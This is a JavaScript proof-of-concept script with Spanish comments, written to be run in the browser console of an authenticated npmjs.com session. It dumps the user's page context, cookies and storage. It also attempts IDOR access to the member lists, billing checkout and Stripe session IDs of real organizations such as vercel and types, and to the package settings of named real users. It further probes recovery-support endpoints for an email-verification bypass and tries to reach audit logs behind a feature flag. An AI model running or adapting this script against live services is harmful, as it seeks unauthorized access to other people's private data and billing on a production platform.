// ================================================================
// PoC v3: Pruebas Críticas - npmjs.com
// Credenciales, datos privados, manipulación de pagos, IDOR
//
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

const csrftoken = window.__context__?.context?.csrftoken;
console.log("=== PoC v3: Pruebas Críticas ===");
console.log("[*] CSRF Token:", csrftoken ? csrftoken.substring(0, 15) + "..." : "NO DISPONIBLE");
console.log("");


// ================================================================
// TEST 1: Extraer TODOS los datos privados del usuario desde SSR
// ================================================================

console.log("=== TEST 1: Datos Privados en window.__context__ ===");
(() => {
    const ctx = window.__context__?.context;
    if (!ctx) {
        console.log("[-] No hay context disponible");
        return;
    }

    // Datos del usuario
    if (ctx.user) {
        console.log("[+] DATOS DEL USUARIO:");
        console.log("    Nombre:", ctx.user.name);
        console.log("    Email:", ctx.user.email || "(no expuesto aquí)");
        console.log("    Avatar:", ctx.user.avatars?.small);
        console.log("    2FA:", ctx.user.tpiTfaEnabled ? "ACTIVADO" : "NO ACTIVADO");
        console.log("    GitHub Linked:", ctx.user.hasGitHubUser ? "SÍ" : "NO");
        console.log("    Full user object keys:", Object.keys(ctx.user));
        console.log("    Full user object:", JSON.stringify(ctx.user, null, 2));
    }

    // Feature flags
    if (ctx.auditLogEnabled !== undefined) {
        console.log("[+] Feature Flags:");
        console.log("    auditLogEnabled:", ctx.auditLogEnabled);
    }

    // Notificaciones (podrían contener info sensible)
    if (ctx.notifications) {
        console.log("[+] Notificaciones:", JSON.stringify(ctx.notifications));
    }

    // CSRF
    console.log("[+] CSRF Token COMPLETO:", ctx.csrftoken);

    // Todas las props
    console.log("[+] TODAS las props disponibles:", Object.keys(ctx));
    console.log("[+] Props completas:", JSON.stringify(ctx, null, 2).substring(0, 3000));
})();


// ================================================================
// TEST 2: Enumerar paquetes privados y orgs
// Página recomendada: /settings/{usuario}/tokens/new
// ================================================================

console.log("\n=== TEST 2: Paquetes Privados y Organizaciones ===");
console.log("[*] Para ver paquetes privados y orgs, navegar a:");
console.log("[*] https://www.npmjs.com/settings/{tu-usuario}/tokens/new");
console.log("[*] Y luego ejecutar este código:");
console.log(`
(() => {
    const ctx = window.__context__?.context;
    if (ctx?.allPackages) {
        console.log("[!!!] PAQUETES DEL USUARIO (incluye PRIVADOS):");
        ctx.allPackages.forEach(p => console.log("    -", p));
        console.log("    Total:", ctx.allPackages.length);
    }
    if (ctx?.allScopes) {
        console.log("[!!!] SCOPES del usuario:");
        ctx.allScopes.forEach(s => console.log("    -", s));
    }
    if (ctx?.allOrgs) {
        console.log("[!!!] ORGANIZACIONES del usuario:");
        ctx.allOrgs.forEach(o => console.log("    -", o));
    }
    // Tokens existentes
    if (ctx?.tokens) {
        console.log("[!!!] TOKENS del usuario:");
        ctx.tokens.forEach(t => {
            console.log("    - Hash:", t.hash, "| Creado:", t.created, "| CIDR:", t.cidr_whitelist);
        });
    }
    console.log("[+] Todas las keys del context:", Object.keys(ctx));
})();
`);


// ================================================================
// TEST 3: IDOR - Acceder a datos de OTRA organización
// ================================================================

console.log("\n=== TEST 3: IDOR en Settings de Org ===");
(async () => {
    // Intentar acceder a settings de orgs conocidas
    const targetOrgs = ['npmjs', 'npm', 'github', 'vercel', 'types'];

    for (const org of targetOrgs) {
        try {
            // Usar el header spiferack para obtener JSON en vez de HTML
            const res = await fetch(`/settings/${org}/members`, {
                headers: {
                    'x-spiferack': '1',
                    'x-requested-with': 'XMLHttpRequest',
                    'manifest-hash': window.__context__?.hash || ''
                },
                credentials: 'include'
            });

            console.log(`[*] /settings/${org}/members → HTTP ${res.status}`);

            if (res.ok) {
                const contentType = res.headers.get('content-type');
                if (contentType?.includes('json')) {
                    const data = await res.json();
                    const keys = Object.keys(data);
                    console.log(`[!!!] DATOS de org "${org}":`);
                    console.log(`    Keys: ${keys.join(', ')}`);
                    if (data.scope) console.log(`    Scope:`, JSON.stringify(data.scope).substring(0, 200));
                    if (data.members) console.log(`    Miembros: ${data.members.length || Object.keys(data.members).length}`);
                    if (data.teams) console.log(`    Teams: ${data.teams.length || 'N/A'}`);
                    if (data.packages) console.log(`    Paquetes:`, data.packages?.length || 'N/A');
                } else {
                    const text = await res.text();
                    // Chequear si hay redirect
                    if (text.includes('x-spiferack-redirect')) {
                        console.log(`    → Redirect (no autorizado probablemente)`);
                    } else {
                        console.log(`    → Respuesta ${contentType} (${text.length} bytes)`);
                    }
                }
            } else if (res.status === 403) {
                console.log(`    → 403 Prohibido (auth server-side funciona)`);
            } else if (res.status === 404) {
                console.log(`    → 404 No encontrado`);
            } else if (res.status === 302 || res.status === 301) {
                console.log(`    → Redirect (no autorizado)`);
            }
        } catch(e) {
            console.log(`[-] Error para ${org}: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 4: IDOR - Intentar acceder a billing/checkout de otra org
// ================================================================

console.log("\n=== TEST 4: IDOR en Billing Checkout ===");
(async () => {
    const targetOrgs = ['npmjs', 'npm', 'vercel', 'types'];

    for (const org of targetOrgs) {
        try {
            const res = await fetch(`/settings/${org}/billing/checkout`, {
                credentials: 'include'
            });

            console.log(`[*] /settings/${org}/billing/checkout → HTTP ${res.status}`);

            if (res.ok) {
                const data = await res.json();
                if (data.sessionId) {
                    console.log(`[!!!] CRÍTICO: Stripe sessionId obtenido para org "${org}": ${data.sessionId.substring(0, 30)}...`);
                    console.log(`[!!!] Esto permitiría manipular el billing de esta org`);
                } else {
                    console.log(`    Respuesta:`, JSON.stringify(data).substring(0, 200));
                }
            } else {
                console.log(`    → HTTP ${res.status} (${res.statusText})`);
            }
        } catch(e) {
            console.log(`[-] Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 5: Acceder a Audit Logs (puede estar oculto por feature flag)
// ================================================================

console.log("\n=== TEST 5: Audit Logs (bypass feature flag) ===");
(async () => {
    const username = window.__context__?.context?.user?.name;
    if (!username) {
        console.log("[-] No autenticado");
        return;
    }

    try {
        const res = await fetch(`/settings/${username}/audit-logs`, {
            headers: {
                'x-spiferack': '1',
                'x-requested-with': 'XMLHttpRequest',
                'manifest-hash': window.__context__?.hash || ''
            },
            credentials: 'include'
        });

        console.log(`[*] /settings/${username}/audit-logs → HTTP ${res.status}`);

        if (res.ok) {
            const contentType = res.headers.get('content-type');
            if (contentType?.includes('json')) {
                const data = await res.json();
                console.log("[!!!] AUDIT LOGS ACCESIBLES:");
                console.log("    Keys:", Object.keys(data));
                if (data.auditLogs || data.logs) {
                    const logs = data.auditLogs || data.logs;
                    console.log("    Cantidad de logs:", Array.isArray(logs) ? logs.length : 'N/A');
                    if (Array.isArray(logs) && logs.length > 0) {
                        console.log("    Primer log:", JSON.stringify(logs[0]).substring(0, 500));
                    }
                }
                console.log("    Respuesta completa:", JSON.stringify(data).substring(0, 1000));
            }
        }
    } catch(e) {
        console.log("[-] Error:", e.message);
    }
})();


// ================================================================
// TEST 6: Recovery Support - Bypass de verificación de email
// ================================================================

console.log("\n=== TEST 6: Recovery Support Endpoints ===");
(async () => {
    const endpoints = [
        '/recovery-support/skip-email-flow',
        '/recovery-support/test',
        '/recovery-support/message/test',
    ];

    for (const ep of endpoints) {
        try {
            const res = await fetch(ep, {
                headers: {
                    'x-spiferack': '1',
                    'x-requested-with': 'XMLHttpRequest'
                },
                credentials: 'include'
            });

            console.log(`[*] ${ep} → HTTP ${res.status}`);

            if (res.ok) {
                const contentType = res.headers.get('content-type');
                if (contentType?.includes('json')) {
                    const data = await res.json();
                    console.log(`[!!!] ENDPOINT ACCESIBLE:`);
                    console.log("    Keys:", Object.keys(data));
                    console.log("    Data:", JSON.stringify(data).substring(0, 500));
                } else {
                    const text = await res.text();
                    console.log(`    Respuesta (${text.length} bytes)`);
                }
            }
        } catch(e) {
            console.log(`[-] Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 7: Sandbox Registry - Verificar si es accesible
// ================================================================

console.log("\n=== TEST 7: Sandbox Registry ===");
console.log("[*] URL descubierta: https://registry-sandbox.npm.red");
console.log("[*] Para probar (ejecutar en nueva pestaña o curl):");
console.log(`
    // El sandbox podría tener validaciones más laxas
    fetch('https://registry-sandbox.npm.red/', {mode: 'cors'})
        .then(r => r.json())
        .then(d => console.log("[+] Sandbox registry:", d))
        .catch(e => console.log("[-] CORS bloqueado o no accesible:", e.message));
`);


// ================================================================
// TEST 8: Enumerar TODAS las rutas internas (127 rutas)
// ================================================================

console.log("\n=== TEST 8: Rutas Internas Completas ===");
(() => {
    const chunks = window.__context__?.chunks;
    if (!chunks) {
        console.log("[-] No hay chunks disponibles");
        return;
    }

    const routes = Object.keys(chunks);
    console.log(`[+] ${routes.length} rutas/páginas registradas:`);

    // Clasificar por categoría
    const categories = {
        auth: routes.filter(r => r.includes('auth') || r.includes('login') || r.includes('signup')),
        settings: routes.filter(r => r.includes('settings') || r.includes('profile')),
        admin: routes.filter(r => r.includes('admin') || r.includes('staff') || r.includes('internal')),
        billing: routes.filter(r => r.includes('billing') || r.includes('payment')),
        tokens: routes.filter(r => r.includes('token')),
        packages: routes.filter(r => r.includes('package')),
        org: routes.filter(r => r.includes('org') || r.includes('team') || r.includes('member')),
        audit: routes.filter(r => r.includes('audit')),
        other: []
    };

    const categorized = new Set([...categories.auth, ...categories.settings, ...categories.admin, ...categories.billing, ...categories.tokens, ...categories.packages, ...categories.org, ...categories.audit]);
    categories.other = routes.filter(r => !categorized.has(r));

    for (const [cat, items] of Object.entries(categories)) {
        if (items.length > 0) {
            console.log(`\n  [${cat.toUpperCase()}] (${items.length}):`);
            items.forEach(r => console.log(`    - ${r}`));
        }
    }
})();


// ================================================================
// TEST 9: Extraer Stripe Key y datos de billing
// ================================================================

console.log("\n=== TEST 9: Stripe Key y Billing ===");
(() => {
    const ctx = window.__context__?.context;
    if (!ctx) return;

    if (ctx.stripeKey) {
        console.log("[+] Stripe Publishable Key:", ctx.stripeKey);
    }
    if (ctx.billingInfo || ctx.billing) {
        console.log("[!!!] BILLING INFO EXPUESTA:", JSON.stringify(ctx.billingInfo || ctx.billing));
    }
    if (ctx.subscription) {
        console.log("[!!!] SUBSCRIPTION DATA:", JSON.stringify(ctx.subscription));
    }
    if (ctx.plan || ctx.planType) {
        console.log("[+] Plan:", ctx.plan || ctx.planType);
    }

    // Buscar cualquier dato de pago en todo el context
    const billingKeys = Object.keys(ctx).filter(k =>
        k.toLowerCase().includes('bill') ||
        k.toLowerCase().includes('pay') ||
        k.toLowerCase().includes('stripe') ||
        k.toLowerCase().includes('card') ||
        k.toLowerCase().includes('subscription') ||
        k.toLowerCase().includes('plan') ||
        k.toLowerCase().includes('price')
    );
    if (billingKeys.length > 0) {
        console.log("[+] Keys relacionadas con billing:", billingKeys);
        billingKeys.forEach(k => console.log(`    ${k}:`, JSON.stringify(ctx[k]).substring(0, 200)));
    }
})();


// ================================================================
// TEST 10: Intentar acceder a paquetes de otros usuarios via API
// ================================================================

console.log("\n=== TEST 10: Acceso a Settings de Otros Usuarios ===");
(async () => {
    // Probar acceder a settings de usuarios conocidos
    const targets = ['isaacs', 'sindresorhus', 'ljharb', 'npm'];

    for (const target of targets) {
        try {
            const res = await fetch(`/settings/${target}/packages`, {
                headers: {
                    'x-spiferack': '1',
                    'x-requested-with': 'XMLHttpRequest',
                    'manifest-hash': window.__context__?.hash || ''
                },
                credentials: 'include'
            });

            console.log(`[*] /settings/${target}/packages → HTTP ${res.status}`);

            if (res.ok) {
                const data = await res.json();
                if (data.packages) {
                    const pkgs = data.packages;
                    const total = pkgs.total || pkgs.length || 'N/A';
                    console.log(`[!!!] PAQUETES de "${target}": ${total} paquetes`);
                    if (Array.isArray(pkgs.objects || pkgs)) {
                        const list = pkgs.objects || pkgs;
                        list.slice(0, 5).forEach(p => {
                            const name = p.name || p.package?.name || JSON.stringify(p).substring(0, 100);
                            const priv = p.private || p.access === 'restricted' ? ' [PRIVADO]' : '';
                            console.log(`    - ${name}${priv}`);
                        });
                        if (list.length > 5) console.log(`    ... y ${list.length - 5} más`);
                    }
                }
                // Buscar datos sensibles
                const keys = Object.keys(data);
                console.log(`    Keys en respuesta: ${keys.join(', ')}`);
            }
        } catch(e) {
            console.log(`[-] Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 11: Verificar si el token de sesión está expuesto
// ================================================================

console.log("\n=== TEST 11: Tokens y Cookies Expuestos ===");
(() => {
    // Verificar cookies accesibles (no httpOnly)
    console.log("[*] Cookies accesibles via JS:");
    const cookies = document.cookie.split(';').map(c => c.trim());
    cookies.forEach(c => {
        const [name, value] = c.split('=');
        if (name) {
            console.log(`    ${name}: ${value ? value.substring(0, 20) + '...' : '(vacía)'}`);
        }
    });

    if (cookies.length === 0 || (cookies.length === 1 && !cookies[0])) {
        console.log("    [+] BIEN: No hay cookies accesibles via JS (todas httpOnly)");
    }

    // Verificar localStorage
    console.log("\n[*] localStorage keys:");
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const val = localStorage.getItem(key);
        console.log(`    ${key}: ${val.substring(0, 100)}${val.length > 100 ? '...' : ''}`);
    }

    // Verificar sessionStorage
    console.log("\n[*] sessionStorage keys:");
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const val = sessionStorage.getItem(key);
        console.log(`    ${key}: ${val.substring(0, 100)}${val.length > 100 ? '...' : ''}`);
    }
})();


// ================================================================
// RESUMEN
// ================================================================

console.log("\n\n=== RESUMEN DE PRUEBAS ===");
console.log("Tests ejecutados: 11");
console.log("Revisar resultados arriba para:");
console.log("  - TEST 1: Datos del usuario expuestos en SSR");
console.log("  - TEST 2: (Ejecutar en /settings/{user}/tokens/new)");
console.log("  - TEST 3: IDOR en orgs - ¿se pueden ver miembros de otras orgs?");
console.log("  - TEST 4: IDOR en billing - ¿se obtiene sessionId de Stripe?");
console.log("  - TEST 5: Audit logs - ¿accesibles aunque el flag esté off?");
console.log("  - TEST 6: Recovery support - ¿endpoints accesibles?");
console.log("  - TEST 7: (Probar manualmente en curl)");
console.log("  - TEST 8: Todas las rutas internas listadas");
console.log("  - TEST 9: Stripe key y datos de billing en contexto");
console.log("  - TEST 10: IDOR - ¿se ven paquetes de otros usuarios?");
console.log("  - TEST 11: Tokens, cookies, localStorage expuestos");
